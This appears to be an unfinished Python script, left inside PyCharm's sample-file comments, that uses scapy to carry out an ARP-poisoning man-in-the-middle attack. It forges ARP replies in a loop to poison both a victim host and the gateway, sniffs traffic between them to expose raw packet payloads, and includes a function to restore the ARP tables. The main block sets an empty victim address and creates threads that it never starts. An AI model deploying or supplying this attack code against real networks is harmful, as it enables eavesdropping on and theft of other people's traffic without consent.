# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import threading

import scapy.all as scapy
import time

from scapy.config import conf


def get_gateway_ip():
    return conf.route.route("0.0.0.0")[2]


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip),
                       psrc=spoof_ip)

    scapy.send(packet, verbose=False)


def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    scapy.send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def arp_poisining(victim_ip, gateway_ip):
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        time.sleep(1)


def analyze_packet(packet):
    packet.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
    time.sleep(2)


def redirect_and_drop(victim_ip, gateway_ip):
    scapy.sniff(filter=f"src host {gateway_ip} && dst host {victim_ip}", prn=analyze_packet, store=0)


if __name__ == '__main__':
    victim_ip = ""
    gateway_ip = get_gateway_ip()
    arp_poisining_thread = threading.Thread(target=arp_poisining, args=(victim_ip, gateway_ip))
    sniffed_packets_droping_thread = threading.Thread(target=redirect_and_drop, args=(victim_ip, gateway_ip))
# See PyCharm help at https://www.jetbrains.com/help/pycharm/
